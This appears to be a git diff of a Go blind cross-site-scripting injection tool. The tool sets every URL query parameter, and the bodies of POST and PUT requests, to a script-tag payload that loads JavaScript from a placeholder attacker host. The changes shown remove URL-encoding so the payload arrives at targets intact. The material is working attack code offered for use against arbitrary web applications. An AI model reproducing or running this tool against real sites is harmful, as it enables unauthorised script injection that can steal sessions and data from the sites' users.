@@ -14,7 +14,7 @@ var userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (K
 var requestDelay = 3 * time.Second
 
 var payloads = []string{
-	`"><script src="https://YOURXSS.DOMAIN"></script>`,
+	`"><script src=\"https://YOURXSS.DOMAIN\"></script>`,
 }
 
 func main() {
@@ -63,11 +63,12 @@ func modifyAllParams(rawURL, payload string) string {
 
 	queryParams := parsedURL.Query()
 
+	newQuery := []string{}
 	for key := range queryParams {
-		queryParams.Set(key, payload) // Replace all values with the same payload
+		newQuery = append(newQuery, fmt.Sprintf("%s=%s", key, payload)) // Keep payload unchanged
 	}
 
-	parsedURL.RawQuery = queryParams.Encode()
+	parsedURL.RawQuery = strings.Join(newQuery, "&")
 	return parsedURL.String()
 }
 
@@ -82,7 +83,7 @@ func sendRequest(targetURL, method string) {
 
 	if method == "POST" || method == "PUT" {
 		parsedURL, _ := url.Parse(targetURL)
-		postData := parsedURL.Query().Encode()
+		postData := parsedURL.RawQuery // Keep data unchanged
 		req, err = http.NewRequest(method, parsedURL.Scheme+"://"+parsedURL.Host+parsedURL.Path, strings.NewReader(postData))
 		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 	} else {
@@ -105,3 +106,4 @@ func sendRequest(targetURL, method string) {
 
 	fmt.Printf("[%s] %s -> %d\n", method, targetURL, resp.StatusCode)
 }
+
